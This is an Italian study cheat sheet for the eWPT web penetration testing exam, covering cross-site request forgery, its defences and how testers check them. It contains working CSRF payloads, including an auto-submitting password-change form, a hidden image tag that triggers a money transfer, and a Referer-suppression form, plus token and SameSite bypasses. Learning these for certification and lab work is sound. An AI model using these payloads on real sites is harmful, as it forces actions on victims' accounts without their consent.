---
layout: cheatsheet
cert: ewpt
cert_label: "eWPT"
title: "CSRF Attacks"
permalink: "/cheatsheet/ewpt/06-authentication-authorization/03-csrf-attacks/"
section: "Authentication & Authorization"
section_order: 6
order: 3
sort_key: 603
---

**Difficoltà:** Intermediate
**Time to Master:** 2h
**Prerequisiti:** [02-Session-Hijacking.md](/cheatsheet/ewpt/06-authentication-authorization/02-session-hijacking/)
**Lab:** PortSwigger Academy, modulo CSRF

---

## Obiettivo

Il CSRF gioca sporco con una caratteristica innocua del browser: allega sempre i cookie di sessione, indipendentemente da chi ha originato la richiesta. Qui vedi come costruire richieste malevole che sfruttano l'autenticazione già attiva della vittima nel suo browser, forzando azioni indesiderate (cambio password, trasferimento fondi, modifica email) senza che se ne accorga.

---

## Concetti chiave

### Perché funziona

Il browser allega automaticamente i cookie di sessione ad ogni richiesta verso il dominio corrispondente, indipendentemente dal sito che ha originato la richiesta: se l'app non verifica un token anti-CSRF o l'origine della richiesta, non distingue una richiesta legittima da una forzata.

Dal 2020 i browser moderni impostano `SameSite=Lax` di default sui cookie che non specificano l'attributo, il che blocca già molte richieste cross-site via POST/fetch/XHR. Un token anti-CSRF (o un controllo `Origin`) resta comunque necessario perché `Lax` non protegge gli endpoint GET che cambiano stato (navigazione top-level, vedi Evasion), non protegge da richieste provenienti da un subdomain dello stesso "site", e molte API impostano deliberatamente `SameSite=None` per supportare integrazioni cross-site legittime, perdendo così la protezione di default.

### Difese comuni e come verificarle

| Difesa | Come verificarne l'assenza/debolezza |
|--------|------------------------------------------|
| CSRF token | rimuovi il parametro token, o riusa un token di un'altra sessione |
| Controllo header `Referer`/`Origin` | rimuovi l'header o testa se il controllo è bypassabile |
| `SameSite=Strict/Lax` sul cookie | verifica il flag nel `Set-Cookie` |

---

## Strumenti

| Tool | Comando base | Output | Note |
|------|---------------|--------|------|
| Burp: Generate CSRF PoC | click destro su richiesta > Engagement tools | HTML pronto | genera il form automaticamente |
| Browser | apertura HTML PoC | esecuzione reale | verifica finale |

---

## Payload / Esempi

### Esempio 1: form CSRF per cambio password

```html
<html>
  <body>
    <form action="http://target.com/admin/change_password" method="POST">
      <input type="hidden" name="new_password" value="hacker123">
      <input type="hidden" name="confirm_password" value="hacker123">
      <input type="submit" value="Click here to win a prize">
    </form>
    <script>document.forms[0].submit()</script>
  </body>
</html>
```

**Spiegazione:** l'auto-submit via JS elimina la necessità che la vittima clicchi manualmente; basta che visiti la pagina mentre è loggata sul target.

### Esempio 2: CSRF via GET (più semplice, se l'endpoint accetta GET per azioni sensibili)

```html
<img src="http://target.com/api/transfer?to=attacker&amount=1000" style="display:none">
```

**Spiegazione:** un endpoint che modifica stato accettando GET è vulnerabile anche solo caricando un'immagine, senza bisogno di form/JS.

### Esempio 3: bypass token CSRF presente ma non legato alla sessione

```
1. Ottieni un CSRF token valido dalla TUA sessione (login come te stesso)
2. Riusa quel token nel form malevolo inviato alla vittima
3. Se il server valida solo "il token esiste ed è valido" senza legarlo alla sessione specifica, l'attacco funziona comunque
```

### Esempio 4: bypass controllo Referer con meta tag

```html
<meta name="referrer" content="no-referrer">
<form action="http://target.com/admin/change_password" method="POST">
  ...
</form>
```

**Spiegazione:** se il server rifiuta solo richieste CON un Referer sbagliato ma accetta quelle senza Referer, sopprimere l'header bypassa il controllo.

---

## Evasion / Bypass Techniques

### Bypass SameSite=Lax con navigazione top-level

`SameSite=Lax` (default in molti browser moderni) blocca richieste cross-site fatte via `fetch`/`form` in iframe, ma **permette** navigazione diretta top-level (click su link, redirect GET). Un endpoint GET sensibile resta sfruttabile anche con `SameSite=Lax`.

### Bypass basato su subdomain (cookie scoping ampio)

Se il cookie è impostato con `Domain=.target.com` (non ristretto al subdomain esatto), un XSS o controllo debole su QUALSIASI subdomain può condurre CSRF sul dominio principale.

---

## Lab Hands-On

### Lab 1: PortSwigger, CSRF where token validation depends on request method
**Obiettivo:** bypassare validazione token cambiando metodo HTTP
**Difficulty:** Medio
**Time:** 30 min

**Walkthrough breve:**
1. Osserva che il token è validato solo su POST
2. Ripeti la stessa azione via GET
3. Conferma che l'azione avviene senza validazione token

---

## Common Mistakes

- Testare solo endpoint POST -> molti endpoint GET modificano stato senza che gli sviluppatori se ne accorgano, e sono ancora più facili da sfruttare
- Non verificare se il token è legato alla sessione specifica -> un token "valido ma non legato" ti sembra una protezione solida finché non scopri che non lo è

---

## Link Utili

- [PortSwigger: CSRF](https://portswigger.net/web-security/csrf)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

---

## Connessioni

- **Prerequisito:** [02-Session-Hijacking.md](/cheatsheet/ewpt/06-authentication-authorization/02-session-hijacking/)
- **Prossimo Step:** [04-IDOR.md](/cheatsheet/ewpt/06-authentication-authorization/04-idor/)

---

## Checklist di padronanza

- [ ] So costruire un PoC CSRF con auto-submit
- [ ] So testare se un token è legato alla sessione specifica
- [ ] So verificare il flag SameSite e le sue reali limitazioni
- [ ] So usare il generatore CSRF PoC di Burp
